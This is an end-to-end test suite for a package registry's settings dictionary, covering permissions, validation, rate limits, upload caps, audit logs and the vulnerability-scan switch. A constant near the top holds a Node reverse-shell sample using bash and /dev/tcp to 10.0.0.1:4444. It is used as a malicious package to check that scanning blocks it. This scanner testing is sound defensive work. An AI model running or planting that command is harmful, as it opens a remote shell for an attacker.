import request from 'supertest';
import { ADMIN, DEVELOPER, createTestApp, type TestContext } from './app-factory';
import { makeNpmTarball } from './fixtures';
import { getConfig, getEnvConfig } from '../src/config/config';

/** 与 security.e2e-spec 同款恶意样本：扫描开启时命中 critical 被拦截 */
const REVERSE_SHELL = `const { exec } = require('child_process');\nexec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');\n`;

function publish(ctx: TestContext, name: string, version: string, tarball: Buffer) {
  return request(ctx.baseUrl)
    .put(`/npm/${name}`)
    .auth(ADMIN.username, ctx.npmTokens[ADMIN.username])
    .send({
      _id: name,
      name,
      'dist-tags': { latest: version },
      versions: { [version]: { name, version, dist: {} } },
      _attachments: {
        [`${name}-${version}.tgz`]: { data: tarball.toString('base64'), length: tarball.length },
      },
    });
}

function saveDict(ctx: TestContext, values: Record<string, unknown>) {
  return request(ctx.baseUrl)
    .put('/api/v1/dictionary')
    .auth(ADMIN.username, ADMIN.password)
    .send({ values });
}

/** 从 GET 响应中取 key → 条目视图，断言用 */
function itemOf(res: { body: { data: { groups: { key: string; items: Record<string, unknown>[] }[] } } }, key: string) {
  for (const group of res.body.data.groups) {
    const found = group.items.find((item) => item.key === key);
    if (found) return found;
  }
  throw new Error(`字典项不存在: ${key}`);
}

describe('字典管理（e2e）', () => {
  let ctx: TestContext;

  beforeAll(async () => {
    ctx = await createTestApp('dictionary');
  });

  afterAll(async () => {
    await ctx.close();
  });

  it('GET 返回分组与 env 基线值，未覆盖项 overridden=false', async () => {
    const res = await request(ctx.baseUrl)
      .get('/api/v1/dictionary')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);

    const groups = res.body.data.groups as { key: string; items: unknown[] }[];
    expect(groups.map((g) => g.key)).toEqual(['rateLimit', 'security', 'retention', 'backup', 'missing', 'limits']);
    expect(groups[0].items).toHaveLength(5);
    expect(groups[1].items).toHaveLength(3);
    expect(groups[2].items).toHaveLength(2);
    expect(groups[3].items).toHaveLength(2);
    expect(groups[4].items).toHaveLength(1);
    expect(groups[5].items).toHaveLength(2);

    // 测试环境限流默认关闭、扫描默认开启；全部仍是 env 基线
    expect(itemOf(res, 'rateLimit.enabled')).toMatchObject({ value: false, overridden: false, type: 'boolean' });
    expect(itemOf(res, 'rateLimit.authMax')).toMatchObject({ value: 10, overridden: false, type: 'int', min: 1 });
    expect(itemOf(res, 'security.scanEnabled')).toMatchObject({ value: true, overridden: false });
    expect(itemOf(res, 'security.requireSignature')).toMatchObject({ value: false, overridden: false });
  });

  it('权限控制：未登录 401，非管理员 403', async () => {
    const anon = await request(ctx.baseUrl).get('/api/v1/dictionary').expect(401);
    expect(anon.body.code).toBe('AUTH_UNAUTHENTICATED');

    const dev = await request(ctx.baseUrl)
      .put('/api/v1/dictionary')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .send({ values: { 'rateLimit.enabled': true } })
      .expect(403);
    expect(dev.body.code).toBe('AUTH_FORBIDDEN');
  });

  it('保存校验：未知 key、越界整数、错误类型整体拒绝且不落库', async () => {
    const unknown = await saveDict(ctx, { 'not.exists': true }).expect(400);
    expect(unknown.body.code).toBe('SYS_VALIDATION');
    expect(String(unknown.body.details?.reason)).toContain('未登记');

    const tooSmall = await saveDict(ctx, { 'rateLimit.authMax': 0 }).expect(400);
    expect(String(tooSmall.body.details?.reason)).toContain('不能小于');

    const badType = await saveDict(ctx, { 'security.scanEnabled': 'yes' }).expect(400);
    expect(String(badType.body.details?.reason)).toContain('布尔');

    // 校验失败不得写入任何行：仍全部是 env 基线
    const after = await request(ctx.baseUrl)
      .get('/api/v1/dictionary')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(itemOf(after, 'rateLimit.authMax')).toMatchObject({ value: 10, overridden: false });
  });

  it('保存限流参数后持久化、覆盖 env 基线并即时生效', async () => {
    const saved = await saveDict(ctx, {
      'rateLimit.enabled': true,
      'rateLimit.authMax': 2,
      'rateLimit.windowMs': 60_000,
    }).expect(200);

    expect(itemOf(saved, 'rateLimit.enabled')).toMatchObject({ value: true, overridden: true });
    expect(itemOf(saved, 'rateLimit.authMax')).toMatchObject({ value: 2, overridden: true });
    expect(itemOf(saved, 'rateLimit.windowMs')).toMatchObject({ value: 60_000, overridden: true });

    // 覆盖层：getConfig() 生效值为新值，getEnvConfig() 基线仍是 env 默认
    expect(getConfig().rateLimit).toMatchObject({ enabled: true, authMax: 2, windowMs: 60_000 });
    expect(getEnvConfig().rateLimit).toMatchObject({ enabled: false, authMax: 10, windowMs: 60_000 });

    // 重新 GET（新请求）仍读到持久化后的值：证明写入 DB 而非进程内临时态
    const reread = await request(ctx.baseUrl)
      .get('/api/v1/dictionary')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(itemOf(reread, 'rateLimit.authMax').value).toBe(2);
    expect(itemOf(reread, 'rateLimit.authMax').updatedAt).toBeTruthy();

    // 业务模块即时生效：login 是唯一计入 auth 配额的入口，第 3 次触发 429（字典里 authMax=2）
    // 用不存在的账号探测，避免把关卡打到种子账号的失败计数上
    const badLogin = () =>
      request(ctx.baseUrl)
        .post('/api/v1/auth/login')
        .send({ username: 'dict-probe', password: 'Wrong-Pass-2kR5m' });
    await badLogin().expect(401);
    await badLogin().expect(401);
    const limited = await badLogin().expect(429);
    expect(limited.body.code).toBe('SYS_RATE_LIMITED');
  });

  it('上传上限默认是 200MB，可按包类型分别覆盖并即时生效', async () => {
    const MB = 1024 * 1024;
    const before = await request(ctx.baseUrl)
      .get('/api/v1/dictionary')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    // 后端始终以字节存储/校验，只额外下发 unit 供前端按 MB 展示
    expect(itemOf(before, 'limits.maxNpmUploadBytes')).toMatchObject({
      value: 200 * MB,
      unit: 'MB',
      min: 1 * MB,
      max: 256 * MB,
    });
    expect(itemOf(before, 'limits.maxPypiUploadBytes')).toMatchObject({
      value: 200 * MB,
      unit: 'MB',
      min: 1 * MB,
      max: 256 * MB,
    });

    const saved = await saveDict(ctx, {
      'limits.maxNpmUploadBytes': 220 * MB,
      'limits.maxPypiUploadBytes': 180 * MB,
    }).expect(200);
    expect(itemOf(saved, 'limits.maxNpmUploadBytes')).toMatchObject({ value: 220 * MB, overridden: true });
    expect(itemOf(saved, 'limits.maxPypiUploadBytes')).toMatchObject({ value: 180 * MB, overridden: true });
    expect(getConfig().limits.maxNpmUploadBytes).toBe(220 * MB);
    expect(getConfig().limits.maxPypiUploadBytes).toBe(180 * MB);
    // env 基线不被污染，硬天花板保持原值
    expect(getEnvConfig().limits.maxNpmUploadBytes).toBe(200 * MB);
    expect(getEnvConfig().limits.maxPypiPublishBytes).toBe(288 * MB);
  });

  it('上传上限不能超过 HTTP 硬天花板，也不能低于 1MB', async () => {
    const cap = getEnvConfig().limits.maxNpmPublishBytes;
    const tooHigh = await saveDict(ctx, { 'limits.maxNpmUploadBytes': cap + 1 }).expect(400);
    expect(String(tooHigh.body.details?.reason)).toContain('硬天花板');

    const tooLow = await saveDict(ctx, { 'limits.maxPypiUploadBytes': 1 }).expect(400);
    expect(String(tooLow.body.details?.reason)).toContain('不能小于');
  });

  it('配置变更写入审计日志', async () => {
    const audit = await request(ctx.baseUrl)
      .get('/api/v1/audit-logs?action=config.dictionary.update')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const rows = audit.body.data.items as Array<Record<string, unknown>>;
    expect(rows.length).toBeGreaterThanOrEqual(1);
    expect(rows[0].resource_type).toBe('sys_dictionary');
  });

  it('漏洞扫描开关：开启时恶意包被拦截，关闭后直接入库，复检被拒绝', async () => {
    // 扫描开启（env 基线）：恶意代码命中 critical → SEC_BLOCKED
    const malicious = await makeNpmTarball('e2e-dict-mal', '1.0.0', {}, { 'index.js': REVERSE_SHELL });
    const blocked = await publish(ctx, 'e2e-dict-mal', '1.0.0', malicious).expect(403);
    expect(blocked.body.error).toBe('SEC_BLOCKED');

    // 关闭漏洞扫描：同一类包直接入库
    await saveDict(ctx, { 'security.scanEnabled': false }).expect(200);
    expect(getConfig().security.scanEnabled).toBe(false);
    expect(getEnvConfig().security.scanEnabled).toBe(true);

    const malicious2 = await makeNpmTarball('e2e-dict-mal-off', '1.0.0', {}, { 'index.js': REVERSE_SHELL });
    await publish(ctx, 'e2e-dict-mal-off', '1.0.0', malicious2).expect(201);

    const detail = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name: 'e2e-dict-mal-off' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(detail.body.data.versions).toHaveLength(1);

    // 扫描关闭期间复检被明确拒绝，避免安全台账被空转轮次污染
    const rescan = await request(ctx.baseUrl)
      .post('/api/v1/security/rescan')
      .auth(ADMIN.username, ADMIN.password)
      .send({})
      .expect(409);
    expect(rescan.body.code).toBe('SEC_SCAN_DISABLED');

    // 重新开启后复检恢复可用
    await saveDict(ctx, { 'security.scanEnabled': true }).expect(200);
    await request(ctx.baseUrl)
      .post('/api/v1/security/rescan')
      .auth(ADMIN.username, ADMIN.password)
      .send({})
      .expect(201);
  });

  it('功能开关对普通用户可见：关闭扫描后 features 与 me 同步为 false', async () => {
    // 前序用例把 authMax 调到 2，先恢复限流默认值，避免本用例的多次登录请求被 429 拦截
    await saveDict(ctx, { 'rateLimit.enabled': false, 'rateLimit.authMax': 10 }).expect(200);
    await saveDict(ctx, { 'security.scanEnabled': false }).expect(200);

    const features = await request(ctx.baseUrl)
      .get('/api/v1/features')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(features.body.data.securityScanEnabled).toBe(false);

    const me = await request(ctx.baseUrl)
      .get('/api/v1/auth/me')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(me.body.data.features.securityScanEnabled).toBe(false);
    // 普通用户不因读取功能位获得管理员权限
    expect(me.body.data.permissions).not.toContain('config:manage');

    await saveDict(ctx, { 'security.scanEnabled': true }).expect(200);
    const on = await request(ctx.baseUrl)
      .get('/api/v1/features')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(on.body.data.securityScanEnabled).toBe(true);
  });
});
